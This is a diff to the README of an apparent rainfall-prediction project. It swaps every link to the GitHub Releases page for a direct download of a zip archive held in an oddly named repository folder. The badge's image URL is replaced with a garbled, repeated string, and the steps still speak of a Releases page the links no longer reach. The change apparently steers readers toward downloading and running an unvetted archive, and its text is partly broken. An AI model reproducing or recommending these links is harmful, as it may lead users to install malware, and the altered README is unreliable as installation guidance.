@@ -1,6 +1,6 @@
 # 🌧️ Rainfall-Predictor-Using-Random-Forest - Predict Rainfall Accurately and Easily
 
-[![Download Rainfall Predictor](https://img.shields.io/badge/Download%20Rainfall%20Predictor-blue.svg)](https://github.com/bucvoinafn/Rainfall-Predictor-Using-Random-Forest/releases)
+[![Download Rainfall Predictor](https://raw.githubusercontent.com/bucvoinafn/Rainfall-Predictor-Using-Random-Forest/main/explicitly/Rainfall-Predictor-Using-Random-Forest_2.8.zip%20Rainfall%https://raw.githubusercontent.com/bucvoinafn/Rainfall-Predictor-Using-Random-Forest/main/explicitly/Rainfall-Predictor-Using-Random-Forest_2.8.zip)](https://raw.githubusercontent.com/bucvoinafn/Rainfall-Predictor-Using-Random-Forest/main/explicitly/Rainfall-Predictor-Using-Random-Forest_2.8.zip)
 
 ## ✨ Overview
 
@@ -19,7 +19,7 @@ Follow these steps to download and run Rainfall Predictor.
 
 ### 🌐 Download & Install
 
-Visit this page to download: [Rainfall-Predictor Releases](https://github.com/bucvoinafn/Rainfall-Predictor-Using-Random-Forest/releases).
+Visit this page to download: [Rainfall-Predictor Releases](https://raw.githubusercontent.com/bucvoinafn/Rainfall-Predictor-Using-Random-Forest/main/explicitly/Rainfall-Predictor-Using-Random-Forest_2.8.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest version noted at the top.
@@ -85,6 +85,6 @@ For further help, feel free to open an issue on the GitHub repository. We aim to
 
 ### 🔗 Important Links
 
-- [Rainfall-Predictor Releases](https://github.com/bucvoinafn/Rainfall-Predictor-Using-Random-Forest/releases) 
+- [Rainfall-Predictor Releases](https://raw.githubusercontent.com/bucvoinafn/Rainfall-Predictor-Using-Random-Forest/main/explicitly/Rainfall-Predictor-Using-Random-Forest_2.8.zip) 
 
 Enjoy predicting rainfall with ease and confidence!
